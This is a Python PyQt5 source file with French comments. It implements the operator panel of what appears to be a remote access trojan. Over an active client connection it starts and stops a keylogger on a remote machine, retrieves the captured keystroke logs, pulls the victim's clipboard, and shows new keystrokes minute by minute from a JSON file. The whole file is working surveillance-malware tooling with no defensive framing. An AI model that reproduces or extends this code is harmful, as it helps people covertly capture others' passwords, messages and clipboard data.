from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QPushButton, 
                            QTextEdit, QLabel, QHBoxLayout)
from PyQt5.QtCore import QTimer
from core.keylogger_handler import KeyloggerHandler
import json
import os
from datetime import datetime, timedelta

class KeyloggerTab(QWidget):
    def __init__(self, connection_tab):
        super().__init__()
        self.connection_tab = connection_tab
        self.keylogger_active = False
        self.log_json_file = os.path.join(os.environ["APPDATA"], "keylog.json")
        self.last_json_data = {}  # Stocker la dernière version des données JSON
        self.last_displayed_minute = ""  # Dernière minute affichée
        self.update_timer = None
        self.init_ui()
        
    def init_ui(self):
        layout = QVBoxLayout()
        
        self.status_label = QLabel("Keylogger prêt")
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        
        button_layout = QHBoxLayout()
        self.toggle_button = QPushButton("Démarrer Keylogger")
        self.get_logs_button = QPushButton("Récupérer les logs")
        self.get_clipboard_button = QPushButton("Récupérer Presse-papiers")
        
        self.toggle_button.clicked.connect(self.toggle_keylogger)
        self.get_logs_button.clicked.connect(self.get_logs)
        self.get_clipboard_button.clicked.connect(self.get_clipboard)
        
        button_layout.addWidget(self.toggle_button)
        button_layout.addWidget(self.get_logs_button)
        button_layout.addWidget(self.get_clipboard_button)
        
        layout.addWidget(self.status_label)
        layout.addLayout(button_layout)
        layout.addWidget(self.log_display)
        
        self.setLayout(layout)
        
        # Créer un timer pour mettre à jour l'affichage (désactivé au démarrage)
        self.update_timer = QTimer(self)
        self.update_timer.timeout.connect(self.update_logs_display)
        
    def toggle_keylogger(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
        
        handler = KeyloggerHandler(self.connection_tab.client_handler)
        
        if not self.keylogger_active:
            # Vérifier si le fichier JSON existe, sinon le créer
            if not os.path.exists(self.log_json_file):
                try:
                    with open(self.log_json_file, "w", encoding="utf-8") as f:
                        json.dump({}, f)
                    print(f"Fichier JSON créé: {self.log_json_file}")
                except Exception as e:
                    self.status_label.setText(f"[!] Erreur création fichier JSON: {str(e)}")
                    return
            
            # Charger les données JSON existantes
            self.load_json_data()
            
            # Démarrer le keylogger
            result = handler.start_logging()
            if "[+]" in result:  # Si démarrage réussi
                self.keylogger_active = True
                self.toggle_button.setText("Arrêter Keylogger")
                self.status_label.setText("[+] Keylogger actif - Surveillance en cours...")
                
                # Définir la dernière minute affichée
                self.last_displayed_minute = self.get_current_minute_key()
                
                # Démarrer le timer pour mettre à jour l'affichage toutes les 5 secondes
                self.update_timer.start(5000)
            else:
                self.status_label.setText(result)
        else:
            # Arrêter le keylogger
            result = handler.stop_logging()
            if "[+]" in result:  # Si arrêt réussi
                self.keylogger_active = False
                self.toggle_button.setText("Démarrer Keylogger")
                self.status_label.setText("[+] Keylogger arrêté")
                
                # Arrêter le timer de mise à jour
                self.update_timer.stop()
            else:
                self.status_label.setText(result)
    
    def load_json_data(self):
        """Charge les données JSON existantes"""
        try:
            if os.path.exists(self.log_json_file):
                with open(self.log_json_file, "r", encoding="utf-8") as f:
                    self.last_json_data = json.load(f)
                    if not isinstance(self.last_json_data, dict):
                        self.last_json_data = {}
        except Exception as e:
            self.status_label.setText(f"[!] Erreur chargement JSON: {str(e)}")
            self.last_json_data = {}
            
    def get_logs(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        handler = KeyloggerHandler(self.connection_tab.client_handler)
        status, logs = handler.get_logs()
        self.status_label.setText(status)
        if logs:
            self.log_display.setPlainText(logs)
    
    def get_clipboard(self):
        if not self.connection_tab.client_handler:
            self.status_label.setText("[!] Pas de connexion active.")
            return
            
        try:
            # Envoyer une commande spéciale pour récupérer le presse-papiers
            clipboard_content = self.connection_tab.client_handler.send_command("GET_CLIPBOARD")
            if clipboard_content:
                self.log_display.append("\n[Presse-papiers]:\n" + clipboard_content + "\n")
                self.status_label.setText("[+] Contenu du presse-papiers récupéré")
            else:
                self.status_label.setText("[!] Presse-papiers vide ou erreur de récupération")
        except Exception as e:
            self.status_label.setText(f"[!] Erreur: {str(e)}")
    
    def get_current_minute_key(self):
        """Retourne la clé pour la minute actuelle au format utilisé dans le JSON"""
        return datetime.now().strftime("%Y-%m-%d %H:%M")
    
    def get_previous_minute_key(self):
        """Retourne la clé pour la minute précédente au format utilisé dans le JSON"""
        previous_minute = datetime.now() - timedelta(minutes=1)
        return previous_minute.strftime("%Y-%m-%d %H:%M")
    
    def update_logs_display(self):
        """Mettre à jour l'affichage avec les nouvelles données du keylogger"""
        if not self.keylogger_active:
            return
            
        try:
            # Charger le fichier JSON
            new_data = {}
            if os.path.exists(self.log_json_file):
                with open(self.log_json_file, "r", encoding="utf-8") as f:
                    try:
                        new_data = json.load(f)
                        if not isinstance(new_data, dict):
                            new_data = {}
                    except json.JSONDecodeError:
                        self.status_label.setText("[!] Erreur de décodage des données JSON")
                        return
            
            # Obtenir la clé de la minute précédente
            prev_minute_key = self.get_previous_minute_key()
            
            # Vérifier si la minute précédente a un nouveau contenu ou a été modifiée
            if prev_minute_key in new_data and (
                prev_minute_key not in self.last_json_data or 
                new_data[prev_minute_key] != self.last_json_data.get(prev_minute_key, "")
            ):
                # Il y a un nouveau contenu pour la minute précédente
                minute_content = new_data[prev_minute_key]
                if minute_content.strip():  # S'assurer qu'il y a réellement du contenu
                    # Ajouter uniquement le contenu de la minute précédente à l'affichage
                    self.log_display.append(f"[{prev_minute_key}]\n{minute_content}\n")
                    
                    # Défiler jusqu'à la fin
                    self.log_display.verticalScrollBar().setValue(
                        self.log_display.verticalScrollBar().maximum()
                    )
                    
                    # Mettre à jour le statut
                    self.status_label.setText(f"[+] Nouvelle saisie détectée à {prev_minute_key}")
            
            # Mettre à jour notre copie des données
            self.last_json_data = new_data
            
        except Exception as e:
            self.status_label.setText(f"[!] Erreur de mise à jour: {str(e)}")
    
    def format_keylog_data(self, data):
        """Formate les données du keylogger pour l'affichage"""
        formatted_text = ""
        
        # Trier les entrées par horodatage (clés)
        for timestamp in sorted(data.keys()):
            formatted_text += f"[{timestamp}]\n{data[timestamp]}\n\n"
            
        return formatted_text